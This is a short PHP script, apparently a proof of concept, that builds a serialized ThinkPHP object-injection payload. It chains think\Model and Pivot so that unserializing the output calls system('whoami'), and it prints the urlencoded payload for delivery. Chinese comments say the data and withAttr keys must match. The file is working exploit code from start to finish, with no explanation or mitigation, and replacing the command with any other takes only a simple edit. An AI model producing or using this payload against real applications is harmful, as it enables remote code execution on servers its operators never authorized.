<?php
namespace think\model\concern{
    trait Conversion{
    }
    trait Attribute{
    }
}

namespace think{
    class Model{
        use model\concern\Conversion;
        use model\concern\Attribute;
        private $data = ['test' => "whoami"];    //此处2个键名要相同，值为$value
        private $withAttr = ['test' => "system"];    //此处2个键名要相同，值为$closure
        private $lazySave = true;
        private $exists = true;
        protected $connection = "mysql";
        protected $name;
        function __construct(){
                $this->name = $this;
        }
    }
}

namespace think\model {
    use think\Model;
    class Pivot extends Model{
    }
}


namespace{
    $payload = new think\model\Pivot();
    echo urlencode(serialize($payload));
}